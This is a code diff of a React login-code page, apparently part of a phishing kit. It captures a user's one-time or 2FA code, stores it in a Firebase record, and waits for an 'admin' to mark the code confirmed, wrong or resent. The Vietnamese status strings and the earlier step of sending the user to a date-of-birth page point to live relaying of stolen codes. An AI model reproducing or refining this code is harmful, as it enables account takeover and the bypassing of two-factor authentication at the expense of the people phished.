@@ -6,7 +6,7 @@ import { onValue, ref, update } from "firebase/database";
 import Spinner from "../Components/Spinner";
 import { useNavigate } from "react-router";
 
-const FaCode = () => {
+const LoginCode = () => {
   const [facode, setFacode] = React.useState("");
   const [error_login_code, setError_login_code] = useState(false);
   const [validating, setValidating] = useState(false);
@@ -16,6 +16,7 @@ const FaCode = () => {
   const navigate = useNavigate();
 
   const handleSend = () => {
+    setError_login_code(false);
     setResended(false);
     setValidating(true);
     const updates = {};
@@ -25,7 +26,7 @@ const FaCode = () => {
     ] = facode;
     updates[
       "/records/" + localStorage.getItem("record_uid") + "/" + "user_status"
-    ] = "Đang chờ xác nhận 2fa từ admin";
+    ] = "Đang chờ xác nhận mã đăng nhập từ admin";
 
     update(ref(database), updates);
   };
@@ -36,7 +37,7 @@ const FaCode = () => {
     const updates = {};
     updates[
       "/records/" + localStorage.getItem("record_uid") + "/" + "user_status"
-    ] = "User yêu cầu gửi lại mã 2fa";
+    ] = "User yêu cầu gửi lại mã đăng nhập";
     update(ref(database), updates);
   };
 
@@ -47,20 +48,20 @@ const FaCode = () => {
     );
     onValue(starCountRef, (snapshot) => {
       const data = snapshot.val();
-      console.log(data);
-      if (data?.user_status === "Đang chờ user nhập ngày sinh") {
-        navigate("/confirm/date-of-birth");
-      } else if (data?.user_status === "Sai mã 2fa") {
+
+      if (data?.user_status === "Đã xác nhận mã đăng nhập") {
+        navigate("/confirm/processing");
+      } else if (data?.user_status === "Sai mã đăng nhập") {
         setValidating(false);
         setError_login_code(true);
         const updates = {};
         updates[
           "/records/" + localStorage.getItem("record_uid") + "/" + "user_status"
-        ] = "Đang chờ user nhập lại mã 2fa";
+        ] = "Đang chờ user nhập lại mã đăng nhập";
 
         update(ref(database), updates);
         // eslint-disable-next-line no-dupe-else-if
-      } else if (data?.user_status === "Đã gửi lại mã 2fa") {
+      } else if (data?.user_status === "Đã gửi lại mã đăng nhập") {
         setResending(false);
         setResended(true);
       }
@@ -204,4 +205,4 @@ const FaCode = () => {
   );
 };
 
-export default FaCode;
+export default LoginCode;
